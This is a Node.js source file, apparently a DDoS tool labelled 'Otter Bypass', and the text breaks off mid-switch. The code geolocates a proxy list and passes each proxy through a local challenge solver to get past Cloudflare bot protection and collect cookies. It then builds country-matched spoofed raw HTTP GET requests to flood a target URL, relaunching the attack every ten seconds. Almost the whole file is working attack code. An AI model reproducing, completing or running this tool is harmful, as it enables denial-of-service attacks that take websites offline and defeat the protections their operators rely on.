const request = require('request'),
fs = require('fs'),
{
    constants
} = require('crypto'),
http = require('http'),
tls = require('tls'),
rqJar = request.jar(),
gen_uas = require('fake-useragent'),
url = require('url'),
referer = require('rand-referer'),
urlStatusCode = require('url-status-code'),
geoip = require('geoip-country'),
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).setMaxListeners(0);

var log = console.log;

global.logger = function() { 

    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {

        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        return '\x1b[0m(' + ((hour < 10) ? '0' + hour : hour) +':' +((minutes < 10) ? '0' + minutes : minutes) +':' +((seconds < 10) ? '0' + seconds : seconds) +') ';

    }

    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));

};

if(process.argv.length < 9) {

    logger('Use: node main.js [url] [time] [requete per ip] [http version] [ALL/proxy country code] [timeout browser] [proxy list]')
    logger('Exemple: node main.js https://beta.exitus.me/ 120 10 HTTP/1.1 US 60000 proxys.txt')
    process.exit(-1)

}

const target = process.argv[2],
time = process.argv[3],
requeteperip = process.argv[4],
uasoptions = process.argv[5],
httpversion = process.argv[6],
country_proxy = process.argv[7],
requetetimeout = process.argv[8],
browser_count = process.argv[9],
proxylist = process.argv[10],
proxys = fs.readFileSync(proxylist,"utf-8").toString().match(/\S+/g);

setTimeout(() => {
    process.exit(-1)
}, time * 1000)

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
],
lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
],
encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
],
controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
];

var color = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    dim: "\x1b[2m",
    underscore: "\x1b[4m",
    blink: "\x1b[5m",
    reverse: "\x1b[7m",
    hidden: "\x1b[8m",
    black: "\x1b[30m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    white: "\x1b[37m",

};

logger('[Info] Otter Bypass Using Firefox Browser')
logger(`[Info] Target: ${color.cyan}[${target}]${color.reset} | Time: ${color.cyan}[${time}]${color.reset} | Proxys Count: ${color.cyan}[${proxys.length}]${color.reset}`)
logger(`[Info] Desired Proxy Country: ${color.cyan}[${country_proxy}]${color.reset} | Desired Browser Count: ${color.cyan}[${browser_count}]${color.reset} | Requete Per Ip: ${color.cyan}[${requeteperip}]${color.reset}`)

if(country_proxy == 'ALL' || country_proxy == 'all') {

    // coder avec auto adaptation => surement une fonction que je peux use dans la partie du dessous 
    // pour un meilleur header / header / proxy 
    // faire le browsing en fonction qui use le proxy qu'on lui donne au start (comme tlsbrowser3)
    // mettre le flooder & le browser dans la meme fonctions ou faut qu'il soit dépendant

    allfunc()

    function allfunc() {
    
        logger(`[Locate] Starting Locate Proxys`)
    
        var ps = 0;
        var ddosxhackingxhacker = [];
    
        proxys.forEach((p) => {
    
            var ipproxy = p.split(':')[0]
            
            var geo = geoip.lookup(ipproxy);
    
            if(geo.country == null || !geo.country) return logger('[Locate] Failed To Locate Proxy'), process.exit(-1);
    
            var result = geo.country
    
            ps++
            
            ddosxhackingxhacker.push(`${p}#${result}`)
    
        })
    
    
        logger(`[Info] ${color.cyan}[${ps}]${color.reset} Proxys As Been Check`)

        function prxy() {
            return ddosxhackingxhacker[Math.floor(Math.random() * ddosxhackingxhacker.length)]
        }

        startt()

        function startt() {

            for(var z = 0; z <browser_count;z++) {

                const token = prxy()

                var proxy = token.split('#')[0];
                var countrys = token.split('#')[1];

                start_browser(proxy, countrys)

            }

        }

        setInterval(() => {

            startt()

        },10000)

    }    



}else {

    var country_desired_proxy = [];

    localiseproxys()    
    
    function localiseproxys() {
    
        logger(`[Locate] Starting Locate Proxys`)
    
        var ps = 0;
        var izi = 0;
    
        proxys.forEach((p) => {
    
            var ipproxy = p.split(':')[0]
            
            var geo = geoip.lookup(ipproxy);
    
            if(geo.country == null || !geo.country) return logger('[Locate] Failed To Locate Proxy'), process.exit(-1);
    
            var result = geo.country
    
            ps++
            
            if(result == country_proxy) {
    
                country_desired_proxy.push(p)
                izi++
    
            }
    
        })
    
        if(izi == 0) {
            logger(`[Info] Exiting Script No ${color.cyan}[${country_proxy}]${color.reset} Proxys Find In ${color.cyan}[${proxylist}]${color.reset}`)
            process.exit(-1)
        }
    
        logger(`[Info] ${color.cyan}[${ps}]${color.reset} Proxys As Been Check`)
        logger(`[Info] There Is ${color.cyan}[${izi}]${color.reset} Proxys ${color.cyan}[${country_proxy}]${color.reset} In ${color.cyan}[${proxylist}]${color.reset}`)

        function getcountryproxy() {
            return country_desired_proxy[Math.floor(Math.random() * country_desired_proxy.length)]
        }

        startt()

        function startt() {

            for(var z = 0; z <browser_count;z++) {

                start_browser(getcountryproxy(), country_proxy)

            }

        }

        setInterval(() => {

            startt()

        },10000)

    }    

}


function start_browser(api_proxy,countrycode) {

    urlStatusCode(target, (err, statusCode) => {

        if (err) {
        
            logger(`[Status] Failed Check Status Code. Message: ${err.message}`)
        
        } else {
        
            logger(`[Status] Target Status Code Is ${statusCode}`)

            if(statusCode == 502 || statusCode == 503 || statusCode == 500 ) {

                logger('[Status] WebSite Is Offline.')

            }else {

                logger(`[Info] ${color.cyan}[${api_proxy}]${color.reset} Starting Browsing. Country: ${countrycode}`)

                request({
                    method: "POST",
                    url: "http://localhost:8191/v1",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        cmd: "request.get",
                        url: target,
                        proxy: {
                            "url": `http://${api_proxy}/`,
                        },
                        maxTimeout: requetetimeout,
                    }),
            
                }, function (err, res, body){
            
                    if(err){
            
                        return console.log(`[Info] Erreur With The Browser: ${err.message}`)
            
                    }else{
                        
                        var solver = JSON.parse(res.body);
            
                        if(solver.status == 'ok'){
                            logger(`[Solver] ${color.cyan}[${api_proxy}]${color.reset} Status: ${solver.status}.`)
                            var useragent = solver.solution.userAgent
                            if(solver.solution.cookies === undefined || !solver.solution.cookies){
                                console.log(`[Solver] ${color.cyan}[${api_proxy}]${color.reset} Have No Cookie Maybe Next Request.`)
                            }
            
                            const randomuas = gen_uas();
            
                            if(uasoptions == 'random') useragent = randomuas
            
                            if(solver.solution.cookies !== undefined) {
                                const obj = solver.solution.cookies
                                var cookie;
                                var p = JSON.stringify(obj);
                                p = JSON.parse(p);
                                p.forEach((p) => {
                                    if(p == undefined) return;
                                    cookie += p.name + '=' + p.value + ';';
                                    cookie = cookie.replace("undefined","")
                                });
                                
                                logger(`[Solver] ${color.cyan}[${api_proxy}]${color.reset} Solved Challenge.`)
                                logger(`[Solver] ${color.cyan}[${api_proxy}]${color.reset} Get Cookie: ${cookie}.`)
                                logger(`[Solver] ${color.cyan}[${api_proxy}]${color.reset} Get Uas: ${useragent}`)
                                buildflood(api_proxy,useragent,cookie,countrycode)
                            }
            
                        }else {
            
                            if(solver.message == 'Cloudflare Error: Cloudflare has blocked this request. Probably your IP is banned for this site, check in your web browser.') {
            
                                logger(`[Solver] ${color.cyan}[${api_proxy}]${color.reset} Status: \x1b[31mIP Is Banned From CloudFlare\x1b[0m.`)
            
                            }else if(solver.message == 'Message: Error: Unable to process browser request. TimeoutError: Navigation timeout of 2000 ms exceeded'){
            
                                logger(`[Solver] ${color.cyan}[${api_proxy}]${color.reset} Status: \x1b[31mBrowser Is Time Out\x1b[0m.`)
            
                            }else if(solver.message == 'Cloudflare Error: No challenge selectors found, unable to proceed.') {
                                
                                logger(`[Solver] ${color.cyan}[${api_proxy}]${color.reset} Status: \x1b[31mNo Challenge Detected\x1b[0m.`)
            
                            }else{
            
                                logger(`[Solver] ${color.cyan}[${api_proxy}]${color.reset} Status: \x1b[31mdead\x1b[0m. Message: ${solver.message}`)
            
                            }
                        }
                    }
                })

            }
        
        }
      
    })
}

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function buildflood(proxy, uas, cookie, countrycode) {

    logger(`[Builder] ${color.cyan}[${proxy}]${color.reset} Adapting Header For ${countrycode} And Make A Custom Header`)

    var path = url.parse(target).path;
    var host = url.parse(target).host;
    var useragent = uas
    var accepts = accept();
    var langnotfound = lang();
    var encode = encoding();
    var connect = 'Keep-Alive'
    var controle = controling();
    var v_http = httpversion;
    var ss;

    if(cookie == 'undefined' || !cookie) cookie = request.jar(), logger(`[Builder] ${color.cyan}[${proxy}]${color.reset} Has No Cookie. Adding A Cookie..`)

    switch(countrycode){
        case 'FR':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: fr-FR\r\nContent-Language: fr-FR\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'UA':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: ua-UA\r\nContent-Language: ua-UA\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'SZ':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-SZ\r\nContent-Language: en-SZ\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'PL':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: pl-PL\r\nContent-Language: pl-PL\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'GN':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: fr-GN\r\nContent-Language: fr-GN\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'IN':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: in-IN\r\nContent-Language: in-IN\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'BY':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: ru-BY\r\nContent-Language: ru-BY\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'CO':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-CO\r\nContent-Language: en-CO\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'MX':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-MX\r\nContent-Language: es-MX\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'CL':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-CL\r\nContent-Language: es-CL\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'PK':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-PK\r\nContent-Language: en-PK\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'ID':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: id-ID\r\nContent-Language: id-ID\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'PH':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-PH\r\nContent-Language: en-PH\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'RU':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: ru-RU\r\nContent-Language: ru-RU\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'VN':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: vn-VN\r\nContent-Language: vn-VN\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'BR':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: pt-BR\r\nContent-Language: pt-BR\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'CN':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: cn-CN\r\nContent-Language: cn-CN\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'TH':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: th-TH\r\nContent-Language: th-TH\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'US':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-US\r\nContent-Language: en-US\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'BD':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: bd-BD\r\nContent-Language: bd-BD\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'EG':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-EG\r\nContent-Language: en-EG\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'CR':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-CR\r\nContent-Language: es-CR\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'AR':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-AR\r\nContent-Language: es-AR\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'AU':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-AU\r\nContent-Language: en-AU\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'JP':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: jp-JP\r\nContent-Language: jp-JP\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'SG':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-SG\r\nContent-Language: en-SG\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'UZ':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: uz-UZ\r\nContent-Language: uz-UZ\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'MN':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: mn-MN\r\nContent-Language: mn-MN\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'VE':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-VE\r\nContent-Language: es-VE\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'EC':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-EC\r\nContent-Language: es-EC\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'PE':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-PE\r\nContent-Language: es-PE\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'PY':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-PY\r\nContent-Language: es-PY\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'BO':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-BO\r\nContent-Language: es-BO\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'KH':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-KH\r\nContent-Language: en-KH\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'LY':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-LY\r\nContent-Language: en-LY\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'GB':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-GB\r\nContent-Language: en-GB\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'HK':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-HK\r\nContent-Language: en-HK\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'FI':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: fi-FI\r\nContent-Language: fi-FI\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'CA':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: fr-CA\r\nContent-Language: fr-CA\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'MM':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: mm-MM\r\nContent-Language: mm-MM\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'NG':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-NG\r\nContent-Language: en-NG\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'GE':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: ge-GE\r\nContent-Language: ge-GE\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'PA':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-PA\r\nContent-Language: es-PA\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'GT':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-GT\r\nContent-Language: es-GT\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'KR':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: kr-KR\r\nContent-Language: kr-KR\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'IR':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: ir-IR\r\nContent-Language: ir-IR\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'NA':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-NA\r\nContent-Language: en-NA\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'PS':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: ps-PS\r\nContent-Language: ps-PS\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'DE':
